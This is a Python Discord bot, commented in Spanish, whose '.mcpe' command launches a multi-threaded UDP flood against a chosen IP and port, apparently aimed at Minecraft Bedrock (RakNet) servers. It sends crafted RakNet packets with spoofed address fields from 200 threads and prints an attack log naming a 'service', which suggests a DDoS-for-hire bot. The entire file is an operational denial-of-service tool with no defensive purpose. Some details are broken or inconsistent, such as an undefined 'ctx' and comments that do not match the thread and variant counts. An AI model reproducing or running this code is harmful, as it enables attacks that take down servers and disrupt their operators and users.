import discord
from discord.ext import commands
import socket
import threading
import time
import struct
import random
import os
import json

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='.', intents=intents)

# Variantes avanzadas de RakNet Magic definidas manualmente (50 variantes)
RAKNET_MAGIC_VARIANTS = [
    b'\x01\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78',
    b'\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78',
    b'\x01\xff\xff\x00\xfe\xfe\xfd\xfd\xfd\xfd\xfd\xfd\x12\x34\x56\x78',
    b'\x02\xff\xff\x00\xfe\xfd\xfd\xfd\xfd\xfd\xfd\xfd\x12\x34\x56\x78',
    b'\x03\xff\xff\x00\xfd\xfd\xfd\xfd\xfd\xfd\xfd\xfd\x12\x34\x56\x78',
    b'\x04\xff\xff\x00\xfe\xfe\xfd\xfd\xfd\xfd\xfd\xfe\x12\x34\x56\x78',
    b'\x05\xff\xff\x00\xfe\xfe\xfe\xfd\xfd\xfd\xfd\xfd\x12\x34\x56\x78',
    b'\x06\xff\xff\x00\xfe\xfd\xfd\xfd\xfd\xfd\xfd\xff\x12\x34\x56\x78',
    b'\x07\xff\xff\x00\xfe\xfd\xfd\xfd\xfd\xfd\xfd\xfd\x12\x34\x56\x78',
    b'\x08\xff\xff\x00\xfe\xfe\xfd\xfd\xfd\xfd\xfd\xff\x12\x34\x56\x78',
    b'\x09\xfe\xfe\xfe\xfd\xfd\xfd\xfd\xfd\xfd\x12\x34\x56\x78',
    b'\x0a\xff\xff\x00\xfd\xfd\xfd\xfd\xfd\xfd\xfd\xff\x12\x34\x56\x78',
    b'\x0b\xff\xff\x00\xfe\xfd\xfd\xfd\xfd\xfd\xfd\xff\x12\x34\x56\x78',
    b'\x0c\xff\xff\x00\xfe\xfe\xfd\xfd\xfd\xfd\xfd\xfd\x12\x34\x56\x78',
    b'\x0d\xfe\xfe\xfe\xfd\xfd\xfd\xfd\xfd\xfd\x12\x34\x56\x78',
    b'\x0e\xff\xff\x00\xfd\xfd\xfd\xfd\xfd\xfd\xfd\xff\x12\x34\x56\x78',
    b'\x0f\xff\xff\x00\xfe\xfd\xfd\xfd\xfd\xfd\xfd\xff\x12\x34\x56\x78',
    b'\x10\xff\xff\x00\xfe\xfe\xfd\xfd\xfd\xfd\xfd\xfd\x12\x34\x56\x78',
    b'\x11\xfe\xfe\xfe\xfd\xfd\xfd\xfd\xfd\xfd\x12\x34\x56\x78',
    b'\x12\xff\xff\x00\xfd\xfd\xfd\xfd\xfd\xfd\xfd\xff\x12\x34\x56\x78',
    b'\x13\xff\xff\x00\xfe\xfd\xfd\xfd\xfd\xfd\xfd\xff\x12\x34\x56\x78',
    b'\x14\xff\xff\x00\xfe\xfe\xfd\xfd\xfd\xfd\xfd\xfd\x12\x34\x56\x78',
    b'\x15\xfe\xfe\xfe\xfd\xfd\xfd\xfd\xfd\xfd\x12\x34\x56\x78',
    b'\x16\xff\xff\x00\xfd\xfd\xfd\xfd\xfd\xfd\xfd\xff\x12\x34\x56\x78',
    b'\x17\xff\xff\x00\xfe\xfd\xfd\xfd\xfd\xfd\xfd\xff\x12\x34\x56\x78',
    b'\x18\xff\xff\x00\xfe\xfe\xfd\xfd\xfd\xfd\xfd\xfd\x12\x34\x56\x78',
    b'\x19\xfe\xfe\xfe\xfd\xfd\xfd\xfd\xfd\xfd\x12\x34\x56\x78',
    b'\x1a\xff\xff\x00\xfd\xfd\xfd\xfd\xfd\xfd\xfd\xff\x12\x34\x56\x78',
    b'\x1b\xff\xff\x00\xfe\xfd\xfd\xfd\xfd\xfd\xfd\xff\x12\x34\x56\x78',
    b'\x1c\xff\xff\x00\xfe\xfe\xfd\xfd\xfd\xfd\xfd\xfd\x12\x34\x56\x78',
    b'\x1d\xfe\xfe\xfe\xfd\xfd\xfd\xfd\xfd\xfd\x12\x34\x56\x78',
    b'\x1e\xff\xff\x00\xfd\xfd\xfd\xfd\xfd\xfd\xfd\xff\x12\x34\x56\x78',
    b'\x1f\xff\xff\x00\xfe\xfd\xfd\xfd\xfd\xfd\xfd\xff\x12\x34\x56\x78',
    b'\x20\xff\xff\x00\xfe\xfe\xfd\xfd\xfd\xfd\xfd\xfd\x12\x34\x56\x78',
]

# Función de ataque RAKNET
def raknet_extreme(ip, port, duration):
    end_time = time.time() + duration

    def flood():
        while time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # Usamos UDP
                sock.settimeout(0.1)  # Tiempo de espera reducido para aumentar la velocidad

                for magic in RAKNET_MAGIC_VARIANTS:
                    for _ in range(1000):  # Enviar 1000 paquetes por cada hilo
                        packet = b'\x01' + struct.pack('>Q', random.randint(1, 9999999999)) + magic + os.urandom(128)
                        sock.sendto(packet, (ip, port))

                        sock.sendto(b'\x05' + magic + os.urandom(128), (ip, port))

                        client_id = random.randint(100000, 999999)
                        spoof_ip = socket.inet_aton(f"192.168.{random.randint(0,255)}.{random.randint(0,255)}")
                        req2 = b'\x07' + magic + spoof_ip + struct.pack('>H', random.randint(1000, 65535)) + struct.pack('>Q', client_id) + os.urandom(64)
                        sock.sendto(req2, (ip, port))

                        sock.sendto(b'\x06' + magic + os.urandom(128), (ip, port))
                        sock.sendto(b'\x09' + magic + struct.pack('>Q', random.randint(1, 999999)) + os.urandom(256), (ip, port))

                sock.close()
            except Exception as e:
                print(f"Error: {e}")
                continue

    # Utilizamos 50 hilos para maximizar el ataque
    for _ in range(200):
        threading.Thread(target=flood, daemon=True).start()

    # Información del ataque para ser enviada
    attack_data = {
        "status": "success",
        "message": "Ataque enviado exitosamente",
        "attack_log": {
            "username": str(ctx.author),
            "service": "Apsx Services",
            "host": ip,
            "port": port,
            "time": f"{duration} segundos",
            "method": "RAKNET-FLOOD EXTREME",
            "handlers": "Node (4), Node (1)"
        }
    }
    # Aquí podrías agregar el código para enviar estos datos a un webhook o a otro sistema de log.
    print(json.dumps(attack_data, indent=4))

@bot.command()
async def mcpe(ctx, ip=None, port=None, duration=10):
    if ip and port:
        try:
            raknet_extreme(ip, int(port), int(duration))
            await ctx.send(f"¡Ataque a {ip} en el puerto {port} iniciado por {duration} segundos!")
        except Exception as e:
            await ctx.send(f"Error: {e}")
    else:
        await ctx.send("Por favor, ingrese la dirección IP y el puerto.")

bot.run('TU_TOKEN_DE_DISCORD')
